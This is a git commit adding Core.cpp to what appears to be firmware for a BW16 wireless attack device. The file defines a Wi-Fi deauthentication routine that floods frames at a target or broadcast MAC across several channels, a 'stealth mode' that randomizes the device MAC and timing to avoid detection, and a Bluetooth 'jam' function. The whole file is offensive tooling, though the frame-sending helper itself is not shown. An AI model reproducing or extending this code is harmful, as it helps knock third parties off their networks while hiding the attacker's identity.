3495d922917d1a9c0fecabddc9ac0cb991f2a964
vampel <40074127+vampel@users.noreply.github.com>
2025-03-25 23:50:51 -0700

    Create Core.cpp

---
+++ Firmware-BW16/lib/Core/Core.cpp
@@ -0,0 +1,28 @@
+#include "Core.h"
+
+bool Core::begin() {
+    WiFi.mode(WIFI_OFF);
+    BLEDevice::init("");
+    return true;
+}
+
+void Core::wifi_attack(bool stealth_mode, const uint8_t* mac) {
+    if (stealth_mode) randomize_mac();
+    
+    uint8_t channels[] = {1, 6, 11, 36, 149}; // Canales clave
+    for (uint8_t ch : channels) {
+        if (stealth_mode) delay(random(50, 500));
+        send_deauth_frame(mac ? mac : BROADCAST_MAC, ch);
+    }
+}
+
+void Core::bt_jam(bool random_mac) {
+    if (random_mac) randomize_mac();
+    BLEServer* pServer = BLEDevice::createServer();
+    pServer->getAdvertising()->start();
+}
+
+void Core::randomize_mac() {
+    uint8_t mac[6] = {0x02, random(256), random(256), random(256), random(256), random(256)};
+    esp_wifi_set_mac(WIFI_IF_STA, mac);
+}
